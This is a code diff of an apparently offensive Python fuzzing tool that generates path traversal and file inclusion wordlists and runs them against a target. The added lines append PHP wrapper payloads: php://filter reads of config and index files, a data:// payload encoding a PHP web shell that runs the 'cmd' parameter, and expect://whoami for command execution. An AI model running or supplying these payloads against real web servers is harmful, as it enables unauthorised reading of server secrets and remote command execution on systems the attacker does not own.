@@ -17,7 +17,7 @@ def get_args():
     return parser.parse_args()
 
 
-def generate_wordlist(depth):
+def generate_wordlist(args):
     result = []
     single_options = ["/", "\\"]
     path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f", "\\.."]
@@ -28,7 +28,7 @@ def generate_wordlist(depth):
 
     special_suffixes = [s + '.' + ext for s in special_suffix for ext in web_extensions]
 
-    for d in range(1, depth + 1):
+    for d in range(1, args.depth + 1):
         for target in targets_files:
             if d == 1:
                 for s in single_options:
@@ -56,7 +56,26 @@ def generate_wordlist(depth):
                     for prefix in common_directories_filter:
                         result.append(prefix + payload)
 
+    result = add_php_wrappers(result)
+
     return result
+
+
+def add_php_wrappers(wordlist: list):
+    common_names_web_files = ["index", "index.html", "index.php", "config", "config.php"]
+    php_wrappers = ["php://filter/read=convert.base64-encode/resource="]
+    special_php_wrappers = ["data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=whoami", "expect://whoami"]
+
+    wordlist.extend([f"{php_wrapper}{item}" for item in wordlist for php_wrapper in php_wrappers])
+
+    for php_wrapper in php_wrappers:
+        for name_web_file in common_names_web_files:
+            wordlist.append(f"{php_wrapper}{name_web_file}")
+    
+    for special_php_wrapper in special_php_wrappers:
+        wordlist.append(special_php_wrapper)
+
+    return wordlist
 
 
 def run_attack(args, wordlist):
@@ -106,7 +125,7 @@ def run_attack(args, wordlist):
 def main():
     args = get_args()
 
-    wordlist = generate_wordlist(args.depth)
+    wordlist = generate_wordlist(args)
 
     findings = run_attack(args, wordlist)
 
